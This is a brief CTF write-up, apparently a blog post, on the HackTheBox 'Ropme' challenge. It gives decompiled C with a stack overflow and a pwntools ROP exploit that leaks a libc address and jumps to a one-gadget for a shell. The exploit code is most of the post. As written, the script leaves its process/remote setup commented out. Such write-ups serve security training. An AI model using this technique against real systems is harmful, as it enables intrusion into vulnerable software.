---
title: "[HackTheBox]Ropme"
date: 2020-1-13
tags: [hackthebox.eu]
categories: [hackthebox.eu]
---

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+10h] [rbp-40h]

  puts("ROP me outside, how 'about dah?");
  fflush(stdout);
  fgets(&s, 500, stdin);
  return 0;
}
```

너무 쉬움

> exploit.py

```python
from pwn import *

e = ELF('./ropme')
#p = process('./ropme')
#p = remote()
libc = e.libc

payload = 'A'*0x40
payload += 'realsung'
payload += p64(0x00000000004006d3) + p64(e.got['puts']) + p64(e.plt['puts'])
payload += p64(e.symbols['main'])

p.sendlineafter('?\n',payload)

libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - libc.symbols['puts']
p.sendlineafter('?\n','A'*0x48 + p64(libc_base + 0x45216))

p.interactive()
```

